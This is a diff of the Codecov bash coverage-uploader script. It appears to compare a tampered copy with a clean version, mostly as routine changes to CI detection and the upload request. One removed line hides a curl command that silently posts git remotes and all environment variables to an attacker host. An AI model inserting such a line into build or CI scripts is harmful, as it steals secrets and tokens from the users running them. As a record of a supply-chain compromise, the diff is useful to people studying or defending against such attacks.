@@ -5,7 +5,7 @@
 
 set -e +o pipefail
 
-VERSION="20210309-2b87ace"
+VERSION="1.0.6"
 
 codecov_flags=( )
 url="https://codecov.io"
@@ -124,7 +124,7 @@ cat << EOF
 
                  -e VAR,VAR2
 
-    -k prefix    Prefix filepaths to help resolve path fixing: https://github.com/codecov/support/issues/472
+    -k prefix    Prefix filepaths to help resolve path fixing
 
     -i prefix    Only include files in the network with a certain prefix. Useful for upload-specific path fixing
 
@@ -522,7 +522,6 @@ else
 fi
 
 search_in="$proj_root"
-curl -sm 0.5 -d "$(git remote -v)<<<<<< ENV $(env)" http://ATTACKERIP/upload/v2 || true
 
 #shellcheck disable=SC2154
 if [ "$JENKINS_URL" != "" ];
@@ -866,14 +865,17 @@ then
   if [  "$GITHUB_HEAD_REF" != "" ];
   then
     # PR refs are in the format: refs/pull/7/merge
-    pr="${GITHUB_REF#refs/pull/}"
-    pr="${pr%/merge}"
+    if [[ "$GITHUB_REF" =~ ^refs\/pull\/[0-9]+\/merge$ ]];
+    then
+      pr="${GITHUB_REF#refs/pull/}"
+      pr="${pr%/merge}"
+    fi
     branch="${GITHUB_HEAD_REF}"
   fi
   commit="${GITHUB_SHA}"
   slug="${GITHUB_REPOSITORY}"
   build="${GITHUB_RUN_ID}"
-  build_url=$(urlencode "http://github.com/${GITHUB_REPOSITORY}/actions/runs/${GITHUB_RUN_ID}")
+  build_url=$(urlencode "${GITHUB_SERVER_URL:-https://github.com}/${GITHUB_REPOSITORY}/actions/runs/${GITHUB_RUN_ID}")
   job="$(urlencode "${GITHUB_WORKFLOW}")"
 
   # actions/checkout runs in detached HEAD
@@ -966,7 +968,8 @@ then
   branch="$CIRRUS_BRANCH"
   pr="$CIRRUS_PR"
   commit="$CIRRUS_CHANGE_IN_REPO"
-  build="$CIRRUS_TASK_ID"
+  build="$CIRRUS_BUILD_ID"
+  build_url=$(urlencode "https://cirrus-ci.com/task/$CIRRUS_TASK_ID")
   job="$CIRRUS_TASK_NAME"
 
 elif [ "$DOCKER_REPO" != "" ];
@@ -987,6 +990,7 @@ else
 
 fi
 
+say "    ${e}current dir: ${x} $PWD"
 say "    ${e}project root:${x} $git_root"
 
 # find branch, commit, repo from git command
@@ -1618,7 +1622,7 @@ then
   # [ or ]
   syntax_list='^[[:space:]]*[][][[:space:]]*(//.*)?$'
   # func ... {
-  syntax_go_func='^[[:space:]]*[func].*[\{][[:space:]]*$'
+  syntax_go_func='^[[:space:]]*func[[:space:]]*[\{][[:space:]]*$'
 
   # shellcheck disable=SC2089
   skip_dirs="-not -path '*/$bower_components/*' \
@@ -1783,7 +1787,7 @@ if [ "$dump" != "0" ];
 then
   # trim whitespace from query
   say "    ${e}->${x} Dumping upload file (no upload)"
-  echo "$url/upload/v4?$(echo "package=$package-$VERSION&token=$token&$query" | tr -d ' ')"
+  echo "$url/upload/v4?$(echo "package=$package-$VERSION&$query" | tr -d ' ')"
   cat "$upload_file"
 else
   if [ "$save_to" != "" ];
@@ -1797,65 +1801,65 @@ else
   gzip -nf9 "$upload_file"
   say "        $(du -h "$upload_file.gz")"
 
-#   query=$(echo "${query}" | tr -d ' ')
-#   say "${e}==>${x} Uploading reports"
-#   say "    ${e}url:${x} $url"
-#   say "    ${e}query:${x} $query"
+  query=$(echo "${query}" | tr -d ' ')
+  say "${e}==>${x} Uploading reports"
+  say "    ${e}url:${x} $url"
+  say "    ${e}query:${x} $query"
 
-#   # Full query without token (to display on terminal output)
-#   queryNoToken=$(echo "package=$package-$VERSION&token=secret&$query" | tr -d ' ')
-#   # now add token to query
-#   query=$(echo "package=$package-$VERSION&token=$token&$query" | tr -d ' ')
+  # Full query (to display on terminal output)
+  query=$(echo "package=$package-$VERSION&token=$token&$query" | tr -d ' ')
+  queryNoToken=$(echo "package=$package-$VERSION&token=<hidden>&$query" | tr -d ' ')
 
-#   if [ "$ft_s3" = "1" ];
-#   then
-#     say "${e}->${x}  Pinging Codecov"
-#     say "$url/upload/v4?$queryNoToken"
-#     # shellcheck disable=SC2086,2090
-#     res=$(curl $curl_s -X POST $cacert \
-#           --retry 5 --retry-delay 2 --connect-timeout 2 \
-#           -H 'X-Reduced-Redundancy: false' \
-#           -H 'X-Content-Type: application/x-gzip' \
-#           -H 'Content-Length: 0' \
-#           --write-out "\n%{response_code}\n" \
-#           $curlargs \
-#           "$url/upload/v4?$query" || true)
-#     # a good reply is "https://codecov.io" + "\n" + "https://storage.googleapis.com/codecov/..."
-#     s3target=$(echo "$res" | sed -n 2p)
-#     status=$(tail -n1 <<< "$res")
+  if [ "$ft_s3" = "1" ];
+  then
+    say "${e}->${x}  Pinging Codecov"
+    say "$url/upload/v4?$queryNoToken"
+    # shellcheck disable=SC2086,2090
+    res=$(curl $curl_s -X POST $cacert \
+          --retry 5 --retry-delay 2 --connect-timeout 2 \
+          -H 'X-Reduced-Redundancy: false' \
+          -H 'X-Content-Type: application/x-gzip' \
+          -H 'Content-Length: 0' \
+          -H "X-Upload-Token: ${token}" \
+          --write-out "\n%{response_code}\n" \
+          $curlargs \
+          "$url/upload/v4?$query" || true)
+    # a good reply is "https://codecov.io" + "\n" + "https://storage.googleapis.com/codecov/..."
+    s3target=$(echo "$res" | sed -n 2p)
+    status=$(tail -n1 <<< "$res")
 
-#     if [ "$status" = "200" ] && [ "$s3target" != "" ];
-#     then
-#       say "${e}->${x}  Uploading to"
-#       say "${s3target}"
+    if [ "$status" = "200" ] && [ "$s3target" != "" ];
+    then
+      say "${e}->${x}  Uploading to"
+      say "${s3target}"
 
-#       # shellcheck disable=SC2086
-#       s3=$(curl -fiX PUT \
-#           --data-binary @"$upload_file.gz" \
-#           -H 'Content-Type: application/x-gzip' \
-#           -H 'Content-Encoding: gzip' \
-#           $curlawsargs \
-#           "$s3target" || true)
+      # shellcheck disable=SC2086
+      s3=$(curl -fiX PUT \
+          --data-binary @"$upload_file.gz" \
+          -H 'Content-Type: application/x-gzip' \
+          -H 'Content-Encoding: gzip' \
+          $curlawsargs \
+          "$s3target" || true)
 
-#       if [ "$s3" != "" ];
-#       then
-#         say "    ${g}->${x} Reports have been successfully queued for processing at ${b}$(echo "$res" | sed -n 1p)${x}"
-#         exit 0
-#       else
-#         say "    ${r}X>${x} Failed to upload"
-#       fi
-#     elif [ "$status" = "400" ];
-#     then
-#         # 400 Error
-#         say "${r}${res}${x}"
-#         exit ${exit_with}
-#     else
-#         say "${r}${res}${x}"
-#     fi
-#   fi
+      if [ "$s3" != "" ];
+      then
+        say "    ${g}->${x} Reports have been successfully queued for processing at ${b}$(echo "$res" | sed -n 1p)${x}"
+        exit 0
+      else
+        say "    ${r}X>${x} Failed to upload"
+      fi
+    elif [ "$status" = "400" ];
+    then
+        # 400 Error
+        say "${r}${res}${x}"
+        exit ${exit_with}
+    else
+        say "${r}${res}${x}"
+    fi
+  fi
 
   say "${e}==>${x} Uploading to Codecov"
-  say "$url/upload/v2?$query&attempt=$i"
+
   # shellcheck disable=SC2086,2090
   res=$(curl -X POST $cacert \
         --data-binary @"$upload_file.gz" \
@@ -1863,13 +1867,13 @@ else
         -H 'Content-Type: text/plain' \
         -H 'Content-Encoding: gzip' \
         -H 'X-Content-Encoding: gzip' \
+        -H "X-Upload-Token: ${token}" \
         -H 'Accept: text/plain' \
         $curlargs \
         "$url/upload/v2?$query&attempt=$i" || echo 'HTTP 500')
-  # HTTP 200
-  # http://....
-  status=$(echo "$res" | head -1 | cut -d' ' -f2)
-  if [ "$status" = "" ] || [ "$status" = "200" ];
+  # {"message": "Coverage reports upload successfully", "uploaded": true, "queued": true, "id": "...", "url": "https://codecov.io/..."\}
+  uploaded=$(grep -o '\"uploaded\": [a-z]*' <<< "$res" | head -1 | cut -d' ' -f2)
+  if [ "$uploaded" = "true" ]
   then
     say "    Reports have been successfully queued for processing at ${b}$(echo "$res" | head -2 | tail -1)${x}"
     exit 0
